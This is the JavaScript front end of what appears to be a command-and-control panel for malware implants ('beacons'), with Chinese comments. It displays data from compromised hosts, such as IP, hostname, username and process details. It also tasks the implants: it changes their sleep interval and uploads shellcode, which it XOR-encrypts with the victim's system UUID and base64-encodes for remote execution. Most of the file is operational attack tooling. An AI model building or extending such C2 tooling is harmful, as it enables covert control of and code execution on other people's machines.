// Get current page UUID
const beaconUUID = window.location.pathname.split('/').pop();

// 获取API前缀
function getApiPrefix() {
    return window.APP_CONFIG ? window.APP_CONFIG.apiPrefix : '/web/admin/api';
}

// Format time
function formatTime(timestamp) {
    try {
        console.log('Formatting timestamp:', timestamp, 'Type:', typeof timestamp);

        // If null or undefined, return unknown time
        if (timestamp == null) {
            console.error('Timestamp is null or undefined');
            return 'Unknown Time';
        }

        // Ensure timestamp is a number
        let numericTimestamp;
        if (typeof timestamp === 'string') {
            // Try to convert string to number directly
            numericTimestamp = Number(timestamp);
            if (isNaN(numericTimestamp)) {
                // If conversion fails, might be ISO format string
                numericTimestamp = new Date(timestamp).getTime();
            }
        } else {
            numericTimestamp = timestamp;
        }

        if (isNaN(numericTimestamp)) {
            console.error('Invalid timestamp value:', timestamp);
            return 'Unknown Time';
        }

        // Create Date object
        const date = new Date(numericTimestamp);
        console.log('Created date object:', date);

        if (isNaN(date.getTime())) {
            console.error('Invalid date object for timestamp:', numericTimestamp);
            return 'Unknown Time';
        }

        // Format time
        const formattedTime = date.toLocaleString('en-US', {
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
        });

        console.log('Formatted time:', formattedTime, 'from timestamp:', numericTimestamp);
        return formattedTime;
    } catch (error) {
        console.error('Error formatting time:', error, 'timestamp:', timestamp);
        return 'Unknown Time';
    }
}

// Update Beacon status
function updateBeaconStatus(job) {
    const statusElement = document.getElementById('beaconStatus');
    if (!statusElement) return;

    if (!job) {
        statusElement.textContent = 'Idle';
        statusElement.className = 'badge bg-success';
    } else {
        statusElement.textContent = 'Executing';
        statusElement.className = 'badge bg-warning';
    }
}

// Convert process list to tree structure
function buildProcessTree(processes) {
    // Create process mapping
    const processMap = new Map();
    processes.forEach(proc => {
        processMap.set(proc.pid, {
            ...proc,
            children: []
        });
    });

    // Build tree structure
    const rootProcesses = [];
    processMap.forEach(proc => {
        if (processMap.has(proc.ppid)) {
            processMap.get(proc.ppid).children.push(proc);
        } else {
            rootProcesses.push(proc);
        }
    });

    return rootProcesses;
}

// Generate process tree HTML
function generateProcessTreeHTML(process, level = 0) {
    const indent = '  '.repeat(level);
    let html = `<div class="process-item" style="padding-left: ${level * 20}px">`;
    html += `<div class="process-name">${process.name} (PID: ${process.pid})</div>`;
    if (process.path) {
        html += `<div class="process-path">${process.path}</div>`;
    }
    html += `<div class="process-details">Threads: ${process.threads} | Parent PID: ${process.ppid}</div>`;
    html += '</div>';

    if (process.children && process.children.length > 0) {
        process.children.forEach(child => {
            html += generateProcessTreeHTML(child, level + 1);
        });
    }

    return html;
}

// 格式化任务结果
function formatJobResult(result) {
    try {
        // 尝试解析JSON
        const data = JSON.parse(result);
        
        // 处理进程列表结果
        if (data.processes) {
            let html = '<div class="card mb-3"><div class="card-header d-flex justify-content-between align-items-center">';
            html += `<h5 class="mb-0">进程列表 (共 ${data.processes.length} 个进程)</h5>`;
            html += '<div class="input-group input-group-sm" style="width: 300px;">';
            html += '<input type="text" class="form-control" id="processFilter" placeholder="搜索进程...">';
            html += '</div></div>';
            html += '<div class="card-body"><div class="table-responsive">';
            html += '<table class="table table-striped table-hover" id="processTable">';
            html += '<thead><tr>';
            html += '<th onclick="sortProcessTable(0)">PID ↕</th>';
            html += '<th onclick="sortProcessTable(1)">进程名 ↕</th>';
            html += '<th onclick="sortProcessTable(2)">路径 ↕</th>';
            html += '</tr></thead><tbody>';
            
            data.processes.forEach(proc => {
                html += `<tr>
                    <td>${proc.pid}</td>
                    <td>${proc.name || 'N/A'}</td>
                    <td class="text-break">${proc.path || 'N/A'}</td>
                </tr>`;
            });
            
            html += '</tbody></table></div></div></div>';

            // 添加排序和过滤功能的脚本
            html += `
            <script>
            // 排序功能
            function sortProcessTable(colIndex) {
                const table = document.getElementById('processTable');
                const rows = Array.from(table.getElementsByTagName('tr'));
                const headers = rows.shift(); // 移除表头

                rows.sort((a, b) => {
                    const aValue = a.cells[colIndex].textContent;
                    const bValue = b.cells[colIndex].textContent;
                    
                    // 如果是PID列，按数字排序
                    if (colIndex === 0) {
                        return parseInt(aValue) - parseInt(bValue);
                    }
                    // 其他列按字母排序
                    return aValue.localeCompare(bValue);
                });

                // 重新添加表头和排序后的行
                table.tBodies[0].append(...rows);
            }

            // 过滤功能
            document.getElementById('processFilter').addEventListener('input', function(e) {
                const filter = e.target.value.toLowerCase();
                const rows = document.getElementById('processTable').getElementsByTagName('tr');
                
                for (let i = 1; i < rows.length; i++) {
                    const row = rows[i];
                    const text = row.textContent.toLowerCase();
                    row.style.display = text.includes(filter) ? '' : 'none';
                }
            });
            </script>`;

            return html;
        }
        
        // 如果是其他类型的JSON数据，美化显示
        return `<pre class="bg-light p-3 rounded"><code>${JSON.stringify(data, null, 2)}</code></pre>`;
    } catch (e) {
        // 如果不是JSON，显示错误信息
        if (result.includes('Failed to parse shellcode')) {
            return `<div class="alert alert-danger">
                <h5 class="alert-heading">Shellcode执行失败</h5>
                <p>解析Shellcode时发生错误。请确保：</p>
                <ul>
                    <li>Shellcode文件格式正确（十六进制格式）</li>
                    <li>文件内容不包含额外的空格或换行</li>
                    <li>每个字节都是有效的十六进制值（00-FF）</li>
                </ul>
                <hr>
                <p class="mb-0">详细错误信息：${result}</p>
            </div>`;
        }
        // 其他错误显示为普通文本
        return `<pre class="bg-light p-3 rounded"><code>${result}</code></pre>`;
    }
}

// 更新任务结果显示
function updateJobResult(result) {
    const jobResult = document.getElementById('jobResult');
    if (jobResult) {
        if (result) {
            jobResult.innerHTML = formatJobResult(result);
        } else {
            jobResult.innerHTML = '<div class="alert alert-info">暂无任务结果</div>';
        }
    }
}

// 加载Beacon详情
async function loadBeaconDetails() {
    try {
        const token = localStorage.getItem('token');
        if (!token) {
            const loginPath = window.APP_CONFIG ? window.APP_CONFIG.loginPath : '/login';
            window.location.href = loginPath;
            return;
        }

        const response = await fetch(`${getApiPrefix()}/beacons/${beaconUUID}`, {
            headers: {
                'Authorization': `Bearer ${token}`
            }
        });

        if (response.status === 401) {
            const loginPath = window.APP_CONFIG ? window.APP_CONFIG.loginPath : '/login';
            window.location.href = loginPath;
            return;
        }

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        const beacon = await response.json();
        console.log('Beacon details:', beacon); // 调试用
        
        // 更新基本信息
        const basicInfo = document.getElementById('basicInfo');
        if (!basicInfo) {
            console.error('basicInfo element not found');
            return;
        }

        basicInfo.innerHTML = `
            <tr>
                <th>IP地址</th>
                <td>${beacon.ip || ''}</td>
            </tr>
            <tr>
                <th>主机名</th>
                <td>${beacon.hostname || ''}</td>
            </tr>
            <tr>
                <th>用户名</th>
                <td>${beacon.username || ''}</td>
            </tr>
            <tr>
                <th>进程名</th>
                <td>${beacon.process_name || ''}</td>
            </tr>
            <tr>
                <th>进程路径</th>
                <td>${beacon.process_path || ''}</td>
            </tr>
            <tr>
                <th>进程ID</th>
                <td>${beacon.process_id || ''}</td>
            </tr>
            <tr>
                <th>架构</th>
                <td>${beacon.arch || ''}</td>
            </tr>
            <tr>
                <th>系统UUID</th>
                <td>${beacon.os_uuid || ''}</td>
            </tr>
            <tr>
                <th>Beacon UUID</th>
                <td>${beacon.uuid || ''}</td>
            </tr>
            <tr>
                <th>首次上线</th>
                <td>${formatTime(beacon.first_time)}</td>
            </tr>
            <tr>
                <th>最后在线</th>
                <td>${formatTime(beacon.last_seen)}</td>
            </tr>
        `;

        // 更新状态
        updateBeaconStatus(beacon.job);

        // 更新任务结果
        if (beacon.job_result) {
            updateJobResult(beacon.job_result);
        } else {
        const jobResult = document.getElementById('jobResult');
            if (jobResult) {
                jobResult.textContent = '暂无任务结果';
            }
        }

    } catch (error) {
        console.error('Error loading beacon details:', error);
        alert('加载Beacon详情失败: ' + error.message);
    }
}

// 返回Beacon列表
function goBack() {
    window.location.href = '/web/admin/beacons';
}

// 删除Beacon
function deleteBeacon() {
    if (confirm('确定要删除这个Beacon吗？此操作不可恢复。')) {
        confirmDelete();
    }
}

// 确认删除
async function confirmDelete() {
    try {
        const token = localStorage.getItem('token');
        const response = await fetch(`${getApiPrefix()}/beacons/${beaconUUID}/delete`, {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${token}`
            }
        });

        const data = await response.json();
        
        if (!data.success) {
            throw new Error(data.error || '删除失败');
        }

        alert('删除成功');
        window.location.href = '/web/admin/beacons';
    } catch (error) {
        console.error('Error deleting beacon:', error);
        alert(error.message || '删除失败');
    }
}

// 任务类型切换处理
document.getElementById('taskType').addEventListener('change', function(e) {
    const sleepTimeDiv = document.getElementById('sleepTimeDiv');
    const shellcodeDiv = document.getElementById('shellcodeDiv');
    
    sleepTimeDiv.style.display = 'none';
    shellcodeDiv.style.display = 'none';
    
    switch(e.target.value) {
        case '0x1A':
            sleepTimeDiv.style.display = 'block';
            break;
        case '0x1C':
            shellcodeDiv.style.display = 'block';
            break;
    }
});

// 发送任务
document.getElementById('sendTask').addEventListener('click', async function() {
    const taskType = document.getElementById('taskType').value;
    let taskData = '';

    switch(taskType) {
        case '0x1A':
            const sleepTime = document.getElementById('sleepTime').value;
            if (!sleepTime) {
                alert('请输入Sleep时间');
                return;
            }
            taskData = `Sleep ${sleepTime}`;
            break;
        case '0x1C':
            const file = document.getElementById('shellcodeFile').files[0];
            if (!file) {
                alert('请选择Shellcode文件');
                return;
            }
            
            // 添加文件大小检查
            const maxSize = 4 * 1024 * 1024; // 4MB
            if (file.size > maxSize) {
                alert(`Shellcode文件过大（${(file.size/1024/1024).toFixed(2)}MB），最大允许4MB`);
                return;
            }
            
            try {
                // 获取系统UUID
                const systemUuidRow = Array.from(document.getElementById('basicInfo').getElementsByTagName('tr'))
                    .find(row => row.firstElementChild.textContent === '系统UUID');
                if (!systemUuidRow) {
                    alert('无法获取系统UUID');
                    return;
                }
                const systemUuid = systemUuidRow.lastElementChild.textContent;
                
                // 使用ArrayBuffer读取二进制数据
                const buffer = await file.arrayBuffer();
                const bytes = new Uint8Array(buffer);
                
                // 使用系统UUID加密数据
                for (let i = 0; i < bytes.length; i++) {
                    bytes[i] ^= systemUuid.charCodeAt(i % systemUuid.length);
                }
                
                // 分块处理Base64编码
                const chunkSize = 0x8000; // 每次处理32KB
                let base64Data = '';
                
                for (let i = 0; i < bytes.length; i += chunkSize) {
                    const chunk = bytes.slice(i, i + chunkSize);
                    base64Data += String.fromCharCode.apply(null, chunk);
                }
                
                taskData = btoa(base64Data);
                console.log(`Shellcode文件大小: ${file.size} 字节，Base64编码后大小: ${taskData.length} 字节`);
            } catch (error) {
                console.error('Error reading shellcode file:', error);
                alert('读取Shellcode文件失败: ' + error.message);
                return;
            }
            break;
    }

    try {
        const token = localStorage.getItem('token');
        const response = await fetch(`${getApiPrefix()}/beacons/${beaconUUID}/job`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${token}`
            },
            body: JSON.stringify({
                type: taskType,
                data: taskData
            })
        });

        if (!response.ok) {
            throw new Error('Failed to send task');
        }

        alert('任务发送成功');
        loadBeaconDetails(); // 刷新详情
    } catch (error) {
        console.error('Error sending task:', error);
        alert('发送任务失败');
    }
});

// 页面加载完成后加载Beacon详情
document.addEventListener('DOMContentLoaded', () => {
    if (!beaconUUID) {
        const adminPrefix = window.APP_CONFIG ? window.APP_CONFIG.adminPrefix : '/web/admin';
        window.location.href = adminPrefix + '/beacons';
        return;
    }
    loadBeaconDetails();
});

// 定期刷新Beacon详情
const refreshInterval = setInterval(loadBeaconDetails, 5000); 